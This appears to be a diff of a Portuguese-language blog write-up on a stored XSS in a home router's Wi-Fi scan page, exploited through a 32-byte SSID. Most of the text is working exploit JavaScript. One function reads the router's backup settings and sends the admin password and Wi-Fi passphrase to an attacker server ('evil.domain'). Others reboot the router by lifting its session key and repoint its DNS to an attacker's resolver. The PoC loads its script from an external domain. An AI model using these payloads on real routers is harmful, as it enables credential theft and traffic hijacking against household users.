@@ -55,156 +55,160 @@ E com <strong>32 chars cravados</strong> :</p>
 </code></pre>
 <p>Essa key muda em toda requisição e é passada como parâmetro GET em todos os .cgi , se não for válida ele não realiza a ação. Alguma forma tosca de <a href="https://stackoverflow.com/questions/5207160/what-is-a-csrf-token-what-is-its-importance-and-how-does-it-work#33829607">CSRF Token</a>.</p>
 <p>Então antes de fazer a request para “rebootar” o modem, eu preciso fazer outro request para uma página qualquer para pegar a sessionKey. Abaixo o JS à ser injetado no browser :</p>
-<pre><code>            function reboot_router() {
-                // XSS reiniciar modem
-                // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                // Por quê? Porque é divertido ver um XSS fazer o LED apagar
+<pre><code>function reboot_router() {
+    // XSS reiniciar modem
+    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    // Por quê? Porque é divertido ver um XSS fazer o LED apagar
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/resetrouter.html", false); // GET na interface
-                xmlhttp.send();
-                var w = xmlhttp.responseText.indexOf("Key") ; // Procurando pelo sessionKey
-                var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/resetrouter.html&quot;, false); // GET na interface
+    xmlhttp.send();
+    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Procurando pelo sessionKey
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/rebootinfo.cgi?sessionKey="+sessionKey, false); // Requisita a página de reboot com a sessionKey
-                xmlhttp.send();
-            }
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey, false); // Requisita a página de reboot com a sessionKey
+    xmlhttp.send();
+}
 </code></pre>
+
 <p>Fuçando mais um pouco encontro a página backupsettings.cmd que nada mais é um XML com todas as configurações do modem, inclusive a senha do WiFi em Base64 e a senha do Administrador em PlainText. O mais legal é que não precisa da sessionKey.</p>
-<pre><code>            function get_passwords(attackers_server) {
-                // attackers_server = servidor para enviar as credenciais
-                // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                // Pegar a senha do WiFi e a senha do administrador
-                // através do backup das configurações
+<pre><code>function get_passwords(attackers_server) {
+    // attackers_server = servidor para enviar as credenciais
+    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    // Pegar a senha do WiFi e a senha do administrador
+    // através do backup das configurações
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/backupsettings.cmd", false); // XML da configuração do roteador
-                xmlhttp.send();
-                var k = xmlhttp.responseText.indexOf("Admin") ; // Procurando pela senha do Administrador
-                var y = xmlhttp.responseText.indexOf("KeyPassphrase") ; // Procurando pela senha do WiFi
-                // Adicionando uma imagem na página atual para enviar as credenciais através de GET para o servidor do atacante
-                document.write('&lt;img src="'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'"&gt;'); 
-            }
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/backupsettings.cmd&quot;, false); // XML da configuração do roteador
+    xmlhttp.send();
+    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Procurando pela senha do Administrador
+    var y = xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;) ; // Procurando pela senha do WiFi
+    // Adicionando uma imagem na página atual para enviar as credenciais através de GET para o servidor do atacante
+    document.write('&lt;img src=&quot;'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'&quot;&gt;'); 
+}
 </code></pre>
+
 <p>Por fim, mas não menos importante. Alterando o DNS do roteador nós conseguimos <a href="https://en.wikipedia.org/wiki/DNS_spoofing">DNS Poisoning</a>.</p>
-<pre><code>            function dns_poisoning(attackers_dns) {
-                // attackers_dns = servidor DNS malicioso
-                // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ caralho esse código ta muito feio, desculpa mundo
-                // Altera os servidores de DNS para o do atacante
+<pre><code>function dns_poisoning(attackers_dns) {
+    // attackers_dns = servidor DNS malicioso
+    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ caralho esse código ta muito feio, desculpa mundo
+    // Altera os servidores de DNS para o do atacante
 
-                xmlhttp=new XMLHttpRequest();   
-                xmlhttp.open("GET", "/rede-dnsv4.html", false); 
-                xmlhttp.send();
-                var w = xmlhttp.responseText.indexOf("Key") ;  // Procurando pelo sessionKey
-                var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
-                var i_wanip = xmlhttp.responseText.indexOf("wanip") ;
-                var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
-                var i_wansubnet = xmlhttp.responseText.indexOf("wansubnet") ; 
-                var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
-                var i_wangatewayip = xmlhttp.responseText.indexOf("wangatewayip") ; 
-                var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;
+    xmlhttp=new XMLHttpRequest();   
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); 
+    xmlhttp.send();
+    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ;  // Procurando pelo sessionKey
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
+    var i_wanip = xmlhttp.responseText.indexOf(&quot;wanip&quot;) ;
+    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
+    var i_wansubnet = xmlhttp.responseText.indexOf(&quot;wansubnet&quot;) ; 
+    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
+    var i_wangatewayip = xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;) ; 
+    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress="+wanip+"&amp;wanIfName=wanbridge&amp;wanSubnetMask="+wansubnet+"&amp;wanIntfGateway="+wangatewayip+"&amp;dnsPrimary="+attackers_dns+"&amp;dnsSecondary="+attackers_dns+"&amp;sessionKey="+sessionKey, false);
-                xmlhttp.send(); // Fazendo a requisiço para SALVAR as novas configurações do DNS
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;+wanip+&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;+wansubnet+&quot;&amp;wanIntfGateway=&quot;+wangatewayip+&quot;&amp;dnsPrimary=&quot;+attackers_dns+&quot;&amp;dnsSecondary=&quot;+attackers_dns+&quot;&amp;sessionKey=&quot;+sessionKey, false);
+    xmlhttp.send(); // Fazendo a requisiço para SALVAR as novas configurações do DNS
 
-                // Depois de salvar, precisamos aplicar as configurações, fuck logic
+    // Depois de salvar, precisamos aplicar as configurações, fuck logic
 
-                //Getting a brand NEW SessionKey
-                xmlhttp=new XMLHttpRequest();   
-                xmlhttp.open("GET", "/rede-dnsv4.html", false); // GET the DNS Config page
-                xmlhttp.send();
-                var w = xmlhttp.responseText.indexOf("Key") ;  // Procurando pelo sessionKey
-                var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
+    //Getting a brand NEW SessionKey
+    xmlhttp=new XMLHttpRequest();   
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
+    xmlhttp.send();
+    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ;  // Procurando pelo sessionKey
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
 
-                xmlhttp=new XMLHttpRequest();   
-                xmlhttp.open("GET", "/wandnscfg.cmd?sessionKey="+sessionKey, false); // Aplicando as confs
-                xmlhttp.send();
-            }
+    xmlhttp=new XMLHttpRequest();   
+    xmlhttp.open(&quot;GET&quot;, &quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey, false); // Aplicando as confs
+    xmlhttp.send();
+}
 </code></pre>
+
 <h3>PoC</h3>
-<pre><code>            // Vulnerable URL : https://your.rou.ter.ip/wlscanresults.html
-            // XSS through SSID : '&gt;&lt;script src=//6ks.me&gt;&lt;/script&gt;   ( Exactly 32 bytes u_u )
-            //                             ^
-            //  5char domains are running  |    'src' does not requires quotes , and passing the URL with ony '//' 
-            //  out, grab yours !          +---&gt; it will cause the browser to make the request with the current protocol,
-            //                                   which is HTTP , duh
-            // Below is the content of 6ks.me
-            // index.html ( which is just a JavaScript actually, but we have to use the index to fit the 32 chars ) :
+<pre><code>// Vulnerable URL : https://your.rou.ter.ip/wlscanresults.html
+// XSS through SSID : '&gt;&lt;script src=//6ks.me&gt;&lt;/script&gt;   ( Exactly 32 bytes u_u )
+//                             ^
+//  5char domains are running  |    'src' does not requires quotes , and passing the URL with ony '//' 
+//  out, grab yours !          +---&gt; it will cause the browser to make the request with the current protocol,
+//                                   which is HTTP , duh
+// Below is the content of 6ks.me
+// index.html ( which is just a JavaScript actually, but we have to use the index to fit the 32 chars ) :
 
-            function get_passwords(attackers_server) {
-                // attackers_server = server to send the credentials
-                // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                // XSS to get Admin's login/passwd + Wifi passphrase
-                // from backup settings
+function get_passwords(attackers_server) {
+    // attackers_server = server to send the credentials
+    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    // XSS to get Admin's login/passwd + Wifi passphrase
+    // from backup settings 
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/backupsettings.cmd", false); // GET the Backup XML
-                xmlhttp.send();
-                var k = xmlhttp.responseText.indexOf("Admin") ; // Search for Admin's Login and Password
-                var y = xmlhttp.responseText.indexOf("KeyPassphrase") ; // Search for Wifi PassPhrase
-                // Add a img requesting the attacker website with the leaked passwords in the GET parameters
-                document.write('&lt;img src="'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'"&gt;'); 
-            }
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/backupsettings.cmd&quot;, false); // GET the Backup XML
+    xmlhttp.send();
+    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Search for Admin's Login and Password
+    var y = xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;) ; // Search for Wifi PassPhrase
+    // Add a img requesting the attacker website with the leaked passwords in the GET parameters
+    document.write('&lt;img src=&quot;'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'&quot;&gt;'); 
+}
 
-            function reboot_router() {
-                // XSS + CSRF reboot router
-                // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                // Why? Because It's fun to watch a XSS doing 'physical' stuff
+function reboot_router() {
+    // XSS + CSRF reboot router
+    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    // Why? Because It's fun to watch a XSS doing 'physical' stuff
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/resetrouter.html", false); // GET the page of the reset interface
-                xmlhttp.send();
-                var w = xmlhttp.responseText.indexOf("Key") ; // Search for the SessionKey, some sort of CSRF Token
-                var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/resetrouter.html&quot;, false); // GET the page of the reset interface
+    xmlhttp.send();
+    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/rebootinfo.cgi?sessionKey="+sessionKey, false); // Request the reboot page with the CSRF token
-                xmlhttp.send();
-            }
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey, false); // Request the reboot page with the CSRF token
+    xmlhttp.send();
+}
 
-            function dns_poisoning(attackers_dns) {
-                // attackers_dns = malicious DNS Server
-                // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ holy shit my code is ugly as fuck , sorry world
-                // Alter the DNS Config of the Router
-                // changing the Primary and Secondary DNS to the attacker's one
+function dns_poisoning(attackers_dns) {
+    // attackers_dns = malicious DNS Server
+    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ holy shit my code is ugly as fuck , sorry world
+    // Alter the DNS Config of the Router
+    // changing the Primary and Secondary DNS to the attacker's one
 
-                xmlhttp=new XMLHttpRequest();   
-                xmlhttp.open("GET", "/rede-dnsv4.html", false); // GET the DNS Config page
-                xmlhttp.send();
-                var w = xmlhttp.responseText.indexOf("Key") ; // Search for the SessionKey, some sort of CSRF Token
-                var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
-                var i_wanip = xmlhttp.responseText.indexOf("wanip") ;
-                var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
-                var i_wansubnet = xmlhttp.responseText.indexOf("wansubnet") ; 
-                var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
-                var i_wangatewayip = xmlhttp.responseText.indexOf("wangatewayip") ; 
-                var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;
+    xmlhttp=new XMLHttpRequest();   
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
+    xmlhttp.send();
+    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+    var i_wanip = xmlhttp.responseText.indexOf(&quot;wanip&quot;) ;
+    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
+    var i_wansubnet = xmlhttp.responseText.indexOf(&quot;wansubnet&quot;) ; 
+    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
+    var i_wangatewayip = xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;) ; 
+    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;
 
-                xmlhttp=new XMLHttpRequest();
-                xmlhttp.open("GET", "/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress="+wanip+"&amp;wanIfName=wanbridge&amp;wanSubnetMask="+wansubnet+"&amp;wanIntfGateway="+wangatewayip+"&amp;dnsPrimary="+attackers_dns+"&amp;dnsSecondary="+attackers_dns+"&amp;sessionKey="+sessionKey, false);
-                xmlhttp.send(); // Send the request to SAVE the Primary and Secondary DNS with the CSRF Token
+    xmlhttp=new XMLHttpRequest();
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;+wanip+&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;+wansubnet+&quot;&amp;wanIntfGateway=&quot;+wangatewayip+&quot;&amp;dnsPrimary=&quot;+attackers_dns+&quot;&amp;dnsSecondary=&quot;+attackers_dns+&quot;&amp;sessionKey=&quot;+sessionKey, false);
+    xmlhttp.send(); // Send the request to SAVE the Primary and Secondary DNS with the CSRF Token
 
-                //After saving we need to apply the settings. yeah, fuck logic --'
+    //After saving we need to apply the settings. yeah, fuck logic --'
 
-                //Getting a brand NEW SessionKey
-                xmlhttp=new XMLHttpRequest();   
-                xmlhttp.open("GET", "/rede-dnsv4.html", false); // GET the DNS Config page
-                xmlhttp.send();
-                var w = xmlhttp.responseText.indexOf("Key") ; // Search for the SessionKey, some sort of CSRF Token
-                var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+    //Getting a brand NEW SessionKey
+    xmlhttp=new XMLHttpRequest();   
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
+    xmlhttp.send();
+    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
 
-                xmlhttp=new XMLHttpRequest();   
-                xmlhttp.open("GET", "/wandnscfg.cmd?sessionKey="+sessionKey, false); // GET the apply DNS page
-                xmlhttp.send();
-            }
+    xmlhttp=new XMLHttpRequest();   
+    xmlhttp.open(&quot;GET&quot;, &quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey, false); // GET the apply DNS page
+    xmlhttp.send();
+}
 
-            // Choose your path !
-            //get_passwords("http://evil.domain/") ;
-            //reboot_router();
-            dns_poisoning("1.3.3.7")
+// Choose your path !
+//get_passwords(&quot;http://evil.domain/&quot;) ;
+//reboot_router();
+dns_poisoning(&quot;1.3.3.7&quot;)
 </code></pre>
+
 <h4>PostMortem</h4>
 <ul>
 <li>Pretendo ler o UART essa semana ainda para ver se consigo desbloquear a porta</li>
